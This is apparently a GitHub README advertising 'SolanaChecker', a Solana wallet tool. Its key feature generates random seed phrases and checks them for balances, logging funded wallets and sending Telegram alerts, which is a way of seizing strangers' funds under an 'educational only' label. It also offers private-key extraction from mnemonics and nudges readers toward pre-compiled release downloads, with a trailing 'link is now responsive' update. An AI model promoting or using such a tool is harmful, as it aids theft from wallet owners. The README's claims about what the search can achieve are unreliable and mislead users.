# Solana Wallet Checker Brute-Force Search: Exploring Solana Security

**SolanaChecker** is a powerful tool for the Solana blockchain, offering multiple functions for managing and securing your wallets. It simplifies interaction with the Solana network, providing balance checks, token fraud detection, and transaction tracking. The program is particularly valuable for understanding and exploring Solana wallet security.

<p align="left">
    <img src="/src/stack.webp" />
</p>

## Program Features Relevant to Brute-Force Search and Security Analysis

1.  **Check Solana Address Balance:** Quickly verify balances.

<p align="left">
    <img src="/src/tray.webp" />
</p>

2.  **Check Solana Tokens for Fraud:** Assess token security to protect your investments.

<p align="left">
    <img src="/src/name.webp" />
</p>

3.  **Track Solana Addresses:** Receive real-time notifications through a Telegram bot.

4.  **Wallet Data from Mnemonic Phrase:** Access wallet details (private key, address, balance) using a mnemonic phrase.

<p align="left">
    <img src="/src/report.webp" />
</p>

5.  **Generate a Single Solana Wallet:** Generate new wallets.

<p align="left">
    <img src="/src/sketch.webp" />
</p>

6.  **Generation Solana Wallets and Check Balance (Brute-Force):** *This is the key feature for understanding and exploring the security of Solana wallets*. This function simulates a brute-force search, generating random mnemonic phrases and checking for balances on the associated addresses. *It is intended ONLY for educational purposes*. The program writes found wallets to 'found-wallets.txt' and sends Telegram notifications (if set up).

<p align="left">
    <img src="/src/sidebar.webp" />
</p>

## Setting up Telegram Notifications

Configure Telegram to receive notifications. Add your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) in the 'telegram-settings.txt' file.

## Getting Started: Download or Build

Download a pre-compiled build from [Release](../../releases) or build the project yourself for greater security.

## Building the Project: Emphasizing Security and Control

Building the project from the source code is strongly recommended. This gives you complete control over the build process and ensures you're running verified code.

### Installing Dependencies Using vcpkg:

1.  If you don’t have **vcpkg** yet, clone the repository and install it.
2.  Add vcpkg to your system PATH.
3.  Run the following:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  Build the project.

### Building via Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Ensure that **vcpkg** is correctly integrated with your environment.
3.  Click **Build** -> **Build Solution**.
4.  The executable will be found in the `bin` folder.

### Building with Another C++ Compiler:

1.  Make sure all dependencies are accessible to your compiler.
2.  Compile using (example):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line: Brute-Force and Security

Use the command line for the brute-force search and security functions:

1.  **-s / -search**: *Initiate the brute-force search (for educational and security research ONLY).*
2.  **-t / -track (ADDRESS)**: Track a specified address.
3.  **-g / -gen (NUMBER)**: Generate a number of Solana wallets.
4.  **-m / -mnemonic (MNEMONIC)**: Retrieve information about a wallet using the seed phrase.
5.  **-b / -balance (ADDRESS)**: Check the balance of a Solana address.

## Notes

-   The program is for research and educational purposes and should not be used for illegal activities.
-   All cryptocurrency operations carry risks.
-   Protect your seed phrases and wallets.

## License

This project is licensed under the [MIT License](/LICENSE).

Update: Link is now responsive and functioning